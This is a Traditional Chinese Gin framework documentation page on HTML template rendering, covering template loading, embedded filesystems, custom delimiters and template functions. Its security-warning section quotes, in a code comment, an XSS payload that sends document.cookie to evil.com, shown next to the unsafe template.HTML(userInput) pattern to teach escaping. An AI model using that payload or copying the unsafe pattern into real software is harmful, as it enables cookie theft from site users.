---
title: "HTML 渲染"
sidebar:
  order: 9
---

Gin 使用 [html/template](https://pkg.go.dev/html/template) 套件進行 HTML 渲染。
如需了解更多使用方式，包括可用的佔位符，請參閱 [text/template](https://pkg.go.dev/text/template) 的文件。

使用 LoadHTMLGlob() 或 LoadHTMLFiles() 來選擇要載入的 HTML 檔案。

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/*")
  //router.LoadHTMLFiles("templates/template1.html", "templates/template2.html")
  router.GET("/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{
      "title": "Main website",
    })
  })
  router.Run(":8080")
}
```

templates/index.tmpl

```html
<html>
  <h1>
    {{ .title }}
  </h1>
</html>
```

在不同目錄中使用同名模板

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/**/*")
  router.GET("/posts/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "posts/index.tmpl", gin.H{
      "title": "Posts",
    })
  })
  router.GET("/users/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "users/index.tmpl", gin.H{
      "title": "Users",
    })
  })
  router.Run(":8080")
}
```

**注意：** 請將你的 HTML 模板包裝在 `{{define <template-path>}} {{end}}` 區塊中，並使用相對路徑 `<template-path>` 定義模板檔案。否則 Gin 將無法正確解析模板檔案。

templates/posts/index.tmpl

```html
{{ define "posts/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using posts/index.tmpl</p>
</html>
{{ end }}
```

templates/users/index.tmpl

```html
{{ define "users/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using users/index.tmpl</p>
</html>
{{ end }}
```

### 從 http.FileSystem 載入模板（v1.11+）

如果你的模板是嵌入的或由 `http.FileSystem` 提供，請使用 `LoadHTMLFS`：

```go
import (
  "embed"
  "io/fs"
  "net/http"
  "github.com/gin-gonic/gin"
)

//go:embed templates
var tmplFS embed.FS

func main() {
  r := gin.Default()
  sub, _ := fs.Sub(tmplFS, "templates")
  r.LoadHTMLFS(http.FS(sub), "**/*.tmpl")
  r.GET("/", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{"title": "From FS"})
  })
  r.Run(":8080")
}
```

### 安全警告：`template.HTML()` 會繞過自動跳脫

Go 的 `html/template` 套件會自動跳脫插入模板的值，以防止跨站腳本攻擊（XSS）。然而，當你將字串轉換為 `template.HTML()` 時，你明確地繞過了此保護。如果字串包含使用者提供的輸入，攻擊者可以注入任意 JavaScript。

**不安全——切勿對使用者輸入使用 `template.HTML()`：**

```go
// DANGEROUS: attacker controls userInput, which could be:
// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": template.HTML(userInput), // XSS vulnerability!
})
```

**安全——讓模板引擎自動跳脫使用者輸入：**

```go
// SAFE: html/template will escape any HTML/JS in userInput
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": userInput, // auto-escaped by html/template
})
```

僅對你完全控制的內容使用 `template.HTML()`，例如在你自己程式碼中定義的靜態 HTML 片段。切勿對來自使用者輸入、使用者填寫的資料庫欄位或任何其他不受信任來源的值使用它。

### 自訂模板渲染器

你也可以使用自己的 HTML 模板渲染器

```go
import "html/template"

func main() {
  router := gin.Default()
  html := template.Must(template.ParseFiles("file1", "file2"))
  router.SetHTMLTemplate(html)
  router.Run(":8080")
}
```

### 自訂定界符

你可以使用自訂定界符

```go
  router := gin.Default()
  router.Delims("{[{", "}]}")
  router.LoadHTMLGlob("/path/to/templates")
```

### 自訂模板函式

請參閱詳細的[範例程式碼](https://github.com/gin-gonic/examples/tree/master/template)。

main.go

```go
import (
    "fmt"
    "html/template"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
)

func formatAsDate(t time.Time) string {
    year, month, day := t.Date()
    return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

func main() {
    router := gin.Default()
    router.Delims("{[{", "}]}")
    router.SetFuncMap(template.FuncMap{
        "formatAsDate": formatAsDate,
    })
    router.LoadHTMLFiles("./testdata/template/raw.tmpl")

    router.GET("/raw", func(c *gin.Context) {
        c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
            "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
        })
    })

    router.Run(":8080")
}

```

raw.tmpl

```sh
Date: {[{.now | formatAsDate}]}
```

結果：

```sh
Date: 2017/07/01
```
